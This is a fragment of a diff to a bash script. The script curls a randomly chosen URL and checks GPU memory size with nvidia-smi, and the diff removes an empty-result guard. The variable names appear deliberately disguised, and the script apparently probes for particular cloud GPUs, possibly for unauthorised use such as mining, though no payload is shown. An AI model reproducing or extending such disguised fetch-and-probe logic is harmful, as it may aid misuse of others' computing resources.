@@ -101,9 +101,6 @@ google841212121274=${arr[$rand]}
 
 google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
 
-if [[ $google8412 = "" ]]
-then
-
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 if (($google84 >= 14884 && $google84 <= 16884));
@@ -155,6 +152,8 @@ fi
 fi
 
 
+
+fi
 
 fi
 
